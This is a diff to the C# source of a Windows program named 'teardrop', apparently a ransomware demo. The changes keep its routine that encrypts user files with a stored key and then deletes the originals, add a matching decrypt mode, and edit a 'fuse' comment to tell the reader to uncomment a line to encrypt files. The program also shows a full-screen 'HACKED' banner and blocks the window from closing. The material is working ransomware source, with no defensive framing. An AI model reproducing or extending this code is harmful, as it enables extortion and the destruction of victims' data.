@@ -187,7 +187,7 @@ namespace teardrop
                 panel_theme_flash.Dock = DockStyle.Fill;
                 
                 // Position the Label and set its Text
-                label_theme_flash.Text = "Hacked";
+                label_theme_flash.Text = "HACKED";
                 label_theme_flash.Font = new Font(label_theme_flash.Font.FontFamily, this.Height / 16, label_theme_flash.Font.Style);
                 label_theme_flash.Location = new Point((panel_theme_flash.Width / 2) - (label_theme_flash.Width / 2), (panel_theme_flash.Height / 2) - (label_theme_flash.Height / 2));
 
@@ -334,7 +334,7 @@ namespace teardrop
         }
 
         string[] file;
-        private void ShowAllFoldersUnder(string path, int indent)
+        private void ShowAllFoldersUnder(string path, int indent, string mode = "decrypt")
         {
             try
             {
@@ -370,8 +370,7 @@ namespace teardrop
 
                                 if (validExtensions.Contains(ext.ToLower()))
                                 {
-                                    // This now acts like a fuse so you dont accidentaly encrypt your own hard drive while testing.
-                                    // Srly... use a VM
+                                    // This now acts like a fuse so you dont accidentaly encrypt your own hard drive while testing. Uncomment line below to encrypt files
                                     // Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
 
                                     try
@@ -398,7 +397,7 @@ namespace teardrop
             
         }
 
-        public void GetFiles()
+        public void GetFiles(string mode = "encrypt")
         {
             try
             {
@@ -408,24 +407,31 @@ namespace teardrop
                 {
                     try
                     {
-                        if (!s.Contains(Properties.Settings.Default.extension) && !s.Contains("Sytem Volume Information"))
+                        if (!s.Contains(Properties.Settings.Default.extension) && !s.Contains("Sytem Volume Information") && mode != "decrypt")
                         {
-                            Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
-                            write("Encrypted " + s);
+                            if(mode != "decrypt")
+                            {
+                                Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
+                                write("Encrypted " + s);
 
-                            try
-                            {
-                                File.Delete(s);
-                            }
-                            catch (Exception ex2)
-                            {
-                                write("Cant delete file " + ex2.Message);
-                                Log(ex2.Message, "GetFiles > File Delete Error");
+                                try
+                                {
+                                    File.Delete(s);
+                                }
+                                catch (Exception ex2)
+                                {
+                                    write("Cant delete file " + ex2.Message);
+                                    Log(ex2.Message, "GetFiles > File Delete Error");
+                                }
                             }
                         }
-                        else
+                        else if(mode == "decrypt")
                         {
-
+                            if(s.Contains(Properties.Settings.Default.extension) && !s.Contains("System Volume Information"))
+                            {
+                                Task.Run(() => Crypto.FileDecrypt(s, s.Replace(Properties.Settings.Default.extension, "") , Properties.Settings.Default.key));
+                                write("Decrypted " + s);
+                            }
                         }
                     }
                     catch (Exception ex)
@@ -522,6 +528,11 @@ namespace teardrop
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             e.Cancel = true;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+
         }
     }
 }
